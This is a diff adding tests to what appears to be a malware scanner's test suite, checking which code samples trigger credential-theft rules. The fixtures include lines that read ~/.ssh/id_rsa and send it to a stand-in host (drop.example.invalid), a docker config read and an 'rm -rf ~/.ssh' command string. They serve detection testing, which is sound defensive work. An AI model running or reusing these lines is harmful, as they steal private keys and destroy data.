@@ -263,3 +263,34 @@ def test_an_install_hook_is_not_a_dropper_because_of_a_reference_page(tmp_path: 
         "i.js": "const c = readFileSync(os.homedir() + '/.docker/config.json');\n" + _NET_JS,
     }
     assert "ST-INSTALL-DROPPER" in _ids(_write(tmp_path / "b", stealer))
+
+
+def test_list_data_in_other_shapes_cjk_prose_and_directory_removal(tmp_path: Path):
+    files = {
+        "crates/client/src/client.rs":
+            'match name {\n    | ".git-credentials"\n    | "id_rsa" => true,\n    _ => false,\n}\n',
+        "internal/mcp/resources.go": 'var names = map[string]string{\n'
+                                     '    ".git-credentials": "git credential store",\n}\n',
+        "src/commands/harden.ts": "const MODES = [\n  ['.ssh/id_rsa', 0o600],\n];\n",
+        "src/lib/risk-paths.js": "const RISK = [\n  /^id_rsa\\.[^/]+$/, // id_rsa.pub etc.\n];\n",
+        "src/content/blog/post.ts": "export const zh = `- 窃取 ~/.ssh/ 下的 SSH 私钥和密码`;\n",
+        "src/cli.ts": "console.error(`  demo --input='{\"command\":\"rm -rf ~/.ssh\"}'`);\n",
+        "src/index.js": _NET_JS,
+    }
+    ids = _ids(_write(tmp_path / "a", files))
+    assert "ST-SENS-PATH" not in ids and "ST-COMBO-EXFIL" not in ids
+
+    call = "const k = fs.readFileSync(\n  path.join(os.homedir(), '.ssh/id_rsa'),\n);\n" + _NET_JS
+    assert "ST-COMBO-EXFIL" in _ids(_write(tmp_path / "b", {"src/sync.js": call}))
+
+
+def test_a_multiline_document_written_by_python_is_not_a_path(tmp_path: Path):
+    doc = ('from pathlib import Path\nimport urllib.request\n'
+           'Path("rules.md").write_text("# Rules\n\nNever read ~/.ssh/id_rsa.\n")\n'
+           "urllib.request.urlopen('https://api.example.invalid')\n")
+    assert "ST-SENS-PATH-PY" not in _ids(_write(tmp_path / "a", {"app/selftest.py": doc}))
+
+    read = ('import os, urllib.request\n'
+            'k = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'
+            "urllib.request.urlopen('https://drop.example.invalid', data=k.encode())\n")
+    assert "ST-SENS-PATH-PY" in _ids(_write(tmp_path / "b", {"app/sync.py": read}))
